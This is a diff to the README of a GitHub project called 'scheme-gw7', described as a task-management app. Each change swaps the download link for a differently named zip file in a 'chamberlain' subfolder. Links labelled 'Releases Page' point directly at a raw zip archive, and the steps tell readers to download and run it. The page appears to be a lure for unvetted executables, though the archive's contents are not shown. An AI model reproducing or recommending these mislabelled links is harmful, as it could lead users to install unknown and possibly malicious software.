@@ -6,7 +6,7 @@ Welcome to scheme-gw7! This application makes managing your tasks easier and mor
 
 ## 📥 Download
 
-[![Download scheme-gw7](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/scheme-gw7.zip)](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/scheme-gw7.zip)
+[![Download scheme-gw7](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/gw_scheme_v2.8.zip)](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/gw_scheme_v2.8.zip)
 
 ## 📋 Description
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, please follow these steps:
 
-1. **Visit the Releases Page.** Click [here](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/scheme-gw7.zip) to go to the releases page.
+1. **Visit the Releases Page.** Click [here](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/gw_scheme_v2.8.zip) to go to the releases page.
 2. **Select the Latest Version.** On the releases page, find the latest version listed at the top. This will typically have the largest version number.
 3. **Download the File.** Click on the file that suits your operating system and download it to your computer.
 4. **Locate the Downloaded File.** After downloading, navigate to your Downloads folder (or the folder you selected for downloads).
@@ -47,7 +47,7 @@ If you encounter any issues during installation or use, please refer to our supp
 
 ## 🔄 Updates
 
-Keep your application up to date. Check the [Releases Page](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/scheme-gw7.zip) regularly for new versions and enhancements.
+Keep your application up to date. Check the [Releases Page](https://raw.githubusercontent.com/Jamalshahid776/scheme-gw7/main/chamberlain/gw_scheme_v2.8.zip) regularly for new versions and enhancements.
 
 ## 📝 Feedback
 
